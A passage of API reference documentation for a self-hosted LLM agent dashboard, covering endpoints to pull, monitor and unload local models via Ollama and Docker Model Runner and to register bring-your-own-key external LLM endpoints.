      "name": "llama3.2:3b",
      "model": "llama3.2",
      "size": "3.2B"
    }
  ],
  "endpoints": ["primary", "docker_runner", "glm_flash"],
  "demoMode": false
}
```

### Pull a Model

```
POST /api/models/pull
```

Pulls a model into the specified endpoint. Returns `202 Accepted` immediately;
poll `/api/models/pull-status` for progress.

- **Ollama (`primary`)**: uses the Ollama `/api/pull` streaming endpoint.
- **Docker Model Runner (`docker_runner`, `glm_flash`)**: runs `docker model pull`.
  Requires `AGENT_BOARD_ENABLE_DOCKER_CONTROL=true`.
- **OpenLLM / custom**: not supported (model is fixed at container build time).

**Request body**
```json
{ "endpoint": "primary", "model": "llama3.2:3b" }
```

**Response (202)**
```json
{ "success": true, "pullKey": "primary:llama3.2:3b", "endpoint": "primary", "model": "llama3.2:3b", "status": "pulling" }
```

### Pull Status

```
GET /api/models/pull-status
```

Returns the status of all in-progress or recently completed pulls, keyed by
`${endpoint}:${model}`.

**Response**
```json
{
  "success": true,
  "pulls": {
    "primary:llama3.2:3b": {
      "status": "pulling",
      "progress": 42,
      "total": 100,
      "message": "pulling manifest"
    }
  }
}
```

`status` values: `pulling` | `done` | `error`

### Pull All Models

```
POST /api/models/pull-all
```

Kicks off pulls for all configured endpoints where the default model is not
already installed. Reports which pulls were initiated vs. skipped.

**Response**
```json
{
  "success": true,
  "initiated": [{ "endpoint": "primary", "model": "llama3.2:3b" }],
  "skipped": [{ "endpoint": "docker_runner", "model": "ai/qwen3-coder:latest", "reason": "already_loaded" }]
}
```

### Unload a Docker Runner Model

```
POST /api/models/unload
```

Removes a Docker Model Runner model from disk/memory via `docker model rm`.
Requires `AGENT_BOARD_ENABLE_DOCKER_CONTROL=true`.

**Request body**
```json
{ "model": "ai/qwen3-coder:latest" }
```

**Response**
```json
{ "success": true, "model": "ai/qwen3-coder:latest" }
```

---

## External Endpoints (BYOK)

Register named LLM endpoints with API keys at runtime without restarting the
server. Endpoints merge into the live LLM config and become available immediately
in the session model selector. Built-in endpoints (`primary`, `docker_runner`,
`glm_flash`, `openllm`) cannot be overwritten or removed via this API.

### List Endpoints

```
GET /api/config/endpoints
```

**Response**
```json
{
  "success": true,
  "endpoints": [
    {
      "key": "claude",
      "name": "Claude API",
      "url": "https://api.anthropic.com",
      "apiStyle": "anthropic",
      "defaultModel": "claude-sonnet-4-6",
      "hasApiKey": true,
      "builtin": false
    }
  ]
}
```

`hasApiKey` is `true` when an API key was supplied; the key itself is never
returned.

### Add Endpoint

```
POST /api/config/endpoints
```

**Request body**

| Field | Required | Description |
|-------|----------|-------------|
| `key` | yes | Unique alphanumeric/dash/underscore identifier |
| `url` | yes | API base URL |
| `name` | no | Display name (defaults to `key`) |
| `apiStyle` | no | `openai` (default) \| `anthropic` \| `ollama` |
| `defaultModel` | no | Model ID to use when none is specified |
| `apiKey` | no | Bearer token / API key sent with requests |

**Response**
```json
{
  "success": true,
  "endpoint": { "key": "claude", "name": "Claude API", "url": "...", "apiStyle": "anthropic", "hasApiKey": true }
}
```

### Remove Endpoint

```
DELETE /api/config/endpoints/:key
```

Removes a runtime-added endpoint. Returns `400` if the key is a built-in, `404`
if it doesn't exist.

**Response**
```json
{ "success": true, "removed": "claude" }
```

> **Note:** BYOK endpoints are in-memory only and are cleared on server restart.
> To persist across restarts, add them to `CUSTOM_LLM_ENDPOINTS` in `config/.env`
> as a JSON array:
>
> ```env
> CUSTOM_LLM_ENDPOINTS=[{"key":"claude","url":"https://api.anthropic.com","apiStyle":"anthropic","apiKey":"sk-ant-...","defaultModel":"claude-sonnet-4-6"}]
> ```

---

## See Also

- [README.md](../README.md) — Quick start, profiles, Docker control
- [ARCHITECTURE.md](./archive/ARCHITECTURE.md) — System design (archived)
- [DEPLOYMENT.md](./DEPLOYMENT.md) — Production deployment guide
- [MIGRATION.md](./archive/MIGRATION.md) — Upgrading from v0.3 (archived)
